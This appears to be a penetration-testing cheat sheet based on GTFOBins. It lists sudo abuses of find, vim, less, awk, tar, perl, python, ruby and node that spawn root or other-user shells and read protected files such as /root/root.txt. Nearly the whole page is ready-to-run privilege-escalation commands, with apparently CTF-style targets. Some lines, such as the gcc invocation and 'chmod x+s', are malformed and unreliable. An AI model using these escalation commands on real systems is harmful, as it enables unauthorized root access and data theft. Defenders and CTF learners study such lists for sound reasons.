# GTFOBins - Sudo

[https://gtfobins.github.io/](https://gtfobins.github.io/)

GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. The project collects legitimate [functions](https://gtfobins.github.io/functions/) of Unix binaries that can be abused to ~~get the f\*\*k~~ break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

### Unix Commands - Examples

{% code overflow="wrap" %}
```bash
# Find
sudo find . -exec /bin/sh \; -quit
sudo -u victim /usr/bin/find /home -exec /bin/sh \; -quit  # for victim

# Vim
sudo vim -c ':!/bin/sh'

sudo vim
 ## and type
 :!/bin/bash

sudo -u victim /usr/bin/vim   # for victim user 
 ## and type
 :!/bin/bash

# Less
sudo /usr/bin/less /etc/profile
sudo -u victim /usr/bin/less .profile  # for victim user
## and type
!/bin/sh

# Awk
sudo awk 'BEGIN {system("/bin/sh")}'
awk '{print $0}' /home/victim/key.txt

# cp and chmod to escalate to victim
cd /tmp
gcc -o file.c -o file
sudo -u victim /bin/cp file file2 # for victim user
sudo -u victim /bin/chmod x+s file2 # for victim user
./file2 # to escalate

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# or 
touch somefile
sudo tar cf /dev/null somefile --checkpoint=1 --checkpoint-action=exec=/bin/sh
id
# uid=0(root) gid=0(root) groups=0(root)

# perl 
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo -u victim /usr/bin/perl -e 'exec "/bin/sh";' # for victim 
 
sudo /usr/bin/perl -e 'print `cat /root/root.txt`'
sudo -u victim /usr/bin/perl -e 'print `cat /home/victim/key.txt`' # for victim username
 
# python
sudo /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
sudo -u victim /usr/bin/python -c 'import os; os.system("cat /home/victim/key.txt")'

# ruby
sudo /usr/bin/ruby -e 'exec "/bin/sh"'

sudo -u victim /usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)'
system("cat /home/victim/key.txt")

# node to escalate
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'

# node to read files
 sudo -u victim /usr/local/bin/node -e "var exec = require('child_process').exec;exec('cat /home/victim/key.txt', function (error, stdOut, stdErr) { console.log(stdOut);});"
```
{% endcode %}
